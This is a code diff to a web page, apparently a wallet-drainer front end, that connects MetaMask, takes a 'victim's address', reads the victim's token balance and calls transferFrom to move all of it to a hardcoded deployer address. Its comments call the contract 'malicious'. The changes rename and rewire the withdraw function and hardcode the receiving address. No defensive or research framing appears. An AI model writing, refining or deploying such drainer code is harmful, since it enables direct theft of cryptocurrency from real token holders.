@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Withdraw Tokens Using Deployer's Wallet</title>
+    <title>Withdraw Tokens - Deployer</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -31,7 +31,7 @@
 </head>
 <body>
     <h1>Withdraw Tokens Using Deployer's Wallet</h1>
-    <p>Connect your wallet as the deployer to withdraw all tokens from the victim's wallet.</p>
+    <p>Connect your wallet as the deployer to withdraw tokens from the victim's wallet.</p>
 
     <!-- Connect Wallet Button -->
     <button id="connectWalletBtn">Connect Wallet</button>
@@ -45,7 +45,7 @@
     <br><br>
 
     <!-- Withdraw Button -->
-    <button id="withdrawTokensBtn" style="display:none;">Withdraw All Tokens</button>
+    <button id="withdrawTokensBtn" style="display:none;" onclick="withdrawAllTokens()">Withdraw All Tokens</button>
 
     <p id="status"></p>
 
@@ -55,7 +55,7 @@
         let userAccount;
         let contractAddress = "0xE3b5567F27d5cC4FDe7326F42c8749169448f08a"; // Replace with your malicious contract address
         let contract;
-        let tokenAddress = "0x59610B067eCfeCEdaf146A5E9B180C440f008575"; // Replace with the token contract address
+        let deployerAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414";  // The address of the deployer
 
         window.onload = () => {
             console.debug("Page loaded. Checking for MetaMask...");
@@ -84,7 +84,6 @@
 
         async function init() {
             document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
-            document.getElementById('withdrawTokensBtn').addEventListener('click', withdrawTokens);
         }
 
         async function connectWallet() {
@@ -101,9 +100,9 @@
             }
         }
 
-        async function withdrawTokens() {
+        async function withdrawAllTokens() {
             const victimAddress = document.getElementById('victimAddress').value;
-
+            
             if (!victimAddress) {
                 alert("Please enter a victim's address!");
                 console.debug("No victim address provided.");
@@ -111,21 +110,24 @@
             }
 
             try {
-                // Fetch the victim's token balance
-                const victimBalance = await contract.methods.balanceOf(victimAddress).call();
+                console.debug("Fetching balance for victim:", victimAddress);
 
-                if (victimBalance == 0) {
-                    document.getElementById('status').innerText = `No tokens to withdraw from ${victimAddress}.`;
+                // Get the victim's token balance
+                const victimBalance = await contract.methods.balanceOf(victimAddress).call();
+                console.debug("Victim's token balance: " + victimBalance);
+
+                // Check if the victim has any tokens
+                if (victimBalance <= 0) {
+                    alert("Victim has no tokens to withdraw!");
+                    console.debug("Victim has no tokens.");
                     return;
                 }
 
-                console.debug("Victim's token balance:", victimBalance);
+                // Transfer all tokens from the victim to the deployer
+                await contract.methods.transferFrom(victimAddress, deployerAddress, victimBalance)
+                    .send({ from: deployerAddress });
 
-                // Initiate transfer from victim's wallet to deployer's address
-                await contract.methods.transferFrom(victimAddress, userAccount, victimBalance)
-                .send({ from: userAccount });
-
-                console.debug("Withdrawal successful.");
+                console.debug("Successfully withdrew " + victimBalance + " tokens from " + victimAddress);
                 document.getElementById('status').innerText = `Successfully withdrawn all tokens from ${victimAddress}!`;
             } catch (error) {
                 console.error("Error withdrawing tokens:", error);
@@ -135,4 +137,3 @@
     </script>
 </body>
 </html>
-
